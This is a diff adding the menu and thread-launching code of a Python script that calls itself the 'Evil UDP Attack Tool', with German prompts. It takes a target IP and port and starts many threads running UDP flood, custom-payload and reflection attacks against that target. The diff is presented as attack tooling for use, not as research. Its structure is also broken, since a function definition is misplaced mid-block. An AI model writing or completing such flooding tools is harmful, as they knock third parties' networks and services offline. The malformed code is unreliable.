@@ -507,4 +507,131 @@ def main_menu():
                 packet_size = config['default_packet_size']
             
             delay_input = input("Verzögerung zwischen Paketen in Sekunden (z.B. 0.0 für keine Verzögerung): ").strip()
-           
+           try:
+                delay = float(delay_input)
+            except ValueError:
+                print("Ungültige Eingabe. Standardwert 0.0 wird verwendet.")
+                delay = config['default_delay']
+            
+            log_thread = threading.Thread(target=logger_thread)
+            log_thread.daemon = True
+            log_thread.start()
+            
+            threads = []
+            if choice == "1":
+                config['payload_mode'] = "random"
+                for _ in range(num_threads):
+                    t = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, delay))
+                    t.daemon = True
+                    threads.append(t)
+                    t.start()
+            elif choice == "2":
+                config['payload_mode'] = "custom"
+                if not config.get("custom_payload"):
+                    custom_payload_input = input("Gib den benutzerdefinierten Payload ein (Text): ")
+                    config['custom_payload'] = custom_payload_input
+                for _ in range(num_threads):
+                    t = threading.Thread(target=udp_custom_attack, args=(target_ip, target_port, config['custom_payload'], packet_size, delay))
+                    t.daemon = True
+                    threads.append(t)
+                    t.start()
+            elif choice == "3":
+                config['payload_mode'] = "random"
+                for _ in range(num_threads):
+                    t = threading.Thread(target=udp_reflection_attack, args=(target_ip, target_port, packet_size, delay))
+                    t.daemon = True
+                    threads.append(t)
+                    t.start()
+            
+            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen...\n")
+            stop_event.set()
+            for t in threads:
+                t.join()
+            log("[INFO] Angriff gestoppt.")
+            stop_event.clear()
+            global packet_counter
+            packet_counter = 0
+            input("Drücke ENTER, um zum Hauptmenü zurückzukehren...")
+        elif choice == "4":
+            advanced_settings_menu()
+        elif choice == "5":
+            print_system_info()
+            input("Drücke ENTER, um zum Hauptmenü zurückzukehren...")
+        elif choice == "6":
+            print("Programm wird beendet.")
+            stop_event.set()
+            sys.exit(0)
+        else:
+            print("Ungültige Option. Bitte versuche es erneut.")
+            time.sleep(2)
+            def extended_main_menu():
+    """
+    Erweiterte Version des Hauptmenüs, das zusätzliche Funktionen bietet.
+    """
+    while True:
+        os.system("clear")
+        print("=== Evil UDP Attack Tool - Erweiterte Version ===\n")
+        print("1. Hauptangriff (UDP Flood)")
+        print("2. Erweiterte UDP Funktionen")
+        print("3. Netzwerk Protokoll Einstellungen")
+        print("4. Erweiterte Einstellungen")
+        print("5. Systeminformationen anzeigen")
+        print("6. Beenden")
+        choice = input("Wähle eine Option (1-6): ")
+        if choice == "1":
+            main_menu()
+        elif choice == "2":
+            extra_feature_menu()
+        elif choice == "3":
+            network_protocol_switch_menu()
+        elif choice == "4":
+            advanced_settings_menu()
+        elif choice == "5":
+            print_system_info()
+            input("Drücke ENTER, um zum Menü zurückzukehren...")
+        elif choice == "6":
+            print("Programm wird beendet.")
+            stop_event.set()
+            sys.exit(0)
+        else:
+            print("Ungültige Option. Bitte versuche es erneut.")
+            time.sleep(2)
+
+# =============================================
+# Hauptprogramm
+# =============================================
+
+def main():
+    """
+    Hauptfunktion zum Starten des Evil UDP Attack Tools.
+    """
+    try:
+        while True:
+            os.system("clear")
+            print("=== Evil UDP Attack Tool ===")
+            print("1. Hauptmenü")
+            print("2. Netzwerk Protokoll Einstellungen")
+            print("3. Beenden")
+            main_choice = input("Wähle eine Option (1-3): ")
+            if main_choice == "1":
+                main_menu()
+            elif main_choice == "2":
+                network_protocol_switch_menu()
+            elif main_choice == "3":
+                print("Programm wird beendet.")
+                stop_event.set()
+                sys.exit(0)
+            else:
+                print("Ungültige Option. Bitte versuche es erneut.")
+                time.sleep(2)
+    except KeyboardInterrupt:
+        stop_event.set()
+        print("\n[INFO] Angriff abgebrochen. Programm beendet.")
+        sys.exit(0)
+# =============================================
+# Programmstart
+# =============================================
+
+if __name__ == "__main__":
+    main()
+        
